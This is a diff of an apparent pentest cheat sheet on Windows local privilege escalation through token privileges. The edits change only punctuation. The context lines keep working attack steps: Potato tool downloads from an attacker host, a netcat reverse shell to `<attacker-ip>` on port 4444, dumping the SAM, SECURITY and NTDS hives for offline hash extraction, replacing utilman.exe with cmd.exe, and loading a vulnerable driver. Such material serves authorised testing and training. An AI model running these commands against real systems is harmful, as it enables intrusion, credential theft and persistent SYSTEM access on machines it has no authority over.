@@ -4,7 +4,7 @@
     `whoami /priv` is the first command after landing a Windows shell. Any of SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeDebug, SeTakeOwnership, or SeLoadDriver maps to a concrete local-to-SYSTEM path. Walk them in that order.
 
 !!! warning "Watch out"
-    Many Potato variants rely on the Print Spooler service. It's disabled by default on Server 2019+ after PrintNightmare. Check `Get-Service Spooler` — if stopped/disabled, skip PrintSpoofer and jump to GodPotato or SharpEfsPotato.
+    Many Potato variants rely on the Print Spooler service. It's disabled by default on Server 2019+ after PrintNightmare. Check `Get-Service Spooler`, if stopped/disabled, skip PrintSpoofer and jump to GodPotato or SharpEfsPotato.
 
 ---
 
@@ -31,7 +31,7 @@ whoami /priv | findstr /i "SeImpersonate"
 
 ### GodPotato (Windows Server 2012 – 2022, Windows 8 – 11)
 
-Most reliable modern Potato — no Print Spooler, no DNS requirement, works across all current Windows versions where SeImpersonate is held.
+Most reliable modern Potato, no Print Spooler, no DNS requirement, works across all current Windows versions where SeImpersonate is held.
 
 ```powershell
 iwr http://<attacker-ip>/GodPotato.exe -OutFile C:\Temp\GodPotato.exe
@@ -39,7 +39,7 @@ C:\Temp\GodPotato.exe -cmd "cmd /c whoami"
 C:\Temp\GodPotato.exe -cmd "C:\Temp\nc.exe <attacker-ip> 4444 -e cmd.exe"
 ```
 
-### PrintSpoofer (Windows 10 1809+ / Server 2019 — requires Spooler)
+### PrintSpoofer (Windows 10 1809+ / Server 2019, requires Spooler)
 
 ```powershell
 iwr http://<attacker-ip>/PrintSpoofer.exe -OutFile C:\Temp\PrintSpoofer.exe
@@ -55,7 +55,7 @@ iwr http://<attacker-ip>/SharpEfsPotato.exe -OutFile C:\Temp\SharpEfsPotato.exe
 C:\Temp\SharpEfsPotato.exe -p cmd.exe -a "/c whoami"
 ```
 
-### Juicy Potato (Legacy — Windows < 10 1809 / Server 2016)
+### Juicy Potato (Legacy, Windows < 10 1809 / Server 2016)
 
 ```powershell
 JuicyPotato.exe -l 1337 -p cmd.exe -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
@@ -65,7 +65,7 @@ JuicyPotato.exe -l 1337 -p cmd.exe -t * -c "{4991d34b-80a1-4291-83b6-3328366b909
 
 ## SeBackupPrivilege / SeRestorePrivilege
 
-Grants read (SeBackup) or write (SeRestore) of any file, bypassing ACLs. Both are held by the `Backup Operators` group — a frequent finding on domain-joined servers where operators need to back up the OS without being admin.
+Grants read (SeBackup) or write (SeRestore) of any file, bypassing ACLs. Both are held by the `Backup Operators` group, a frequent finding on domain-joined servers where operators need to back up the OS without being admin.
 
 ### Read SAM/SYSTEM hives → domain hashes offline
 
@@ -75,7 +75,7 @@ reg save HKLM\SYSTEM C:\Temp\system.save
 reg save HKLM\SECURITY C:\Temp\security.save
 ```
 
-`reg save` respects SeBackupPrivilege — works without being admin.
+`reg save` respects SeBackupPrivilege, works without being admin.
 
 Transfer and extract on attacker machine:
 
@@ -83,7 +83,7 @@ Transfer and extract on attacker machine:
 impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
 ```
 
-### On a Domain Controller — dump NTDS
+### On a Domain Controller: dump NTDS
 
 With SeBackup on a DC, copy the live NTDS.DIT and SYSTEM hive:
 
@@ -162,7 +162,7 @@ copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 
 ## SeLoadDriverPrivilege
 
-Load a signed-but-vulnerable driver to execute arbitrary kernel code. Historically abused via `Capcom.sys` — now any driver on [loldrivers.io](https://www.loldrivers.io/) works.
+Load a signed-but-vulnerable driver to execute arbitrary kernel code. Historically abused via `Capcom.sys`, now any driver on [loldrivers.io](https://www.loldrivers.io/) works.
 
 ```powershell
 # EoPLoadDriver is the standard PoC
@@ -179,5 +179,5 @@ Grants full control over `C:\`. Confirmed primitive via [SeManageVolumeExploit](
 
 ```powershell
 SeManageVolumeExploit.exe
-# Now you have write access to protected folders — drop a DLL hijack
+# Now you have write access to protected folders - drop a DLL hijack
 ```
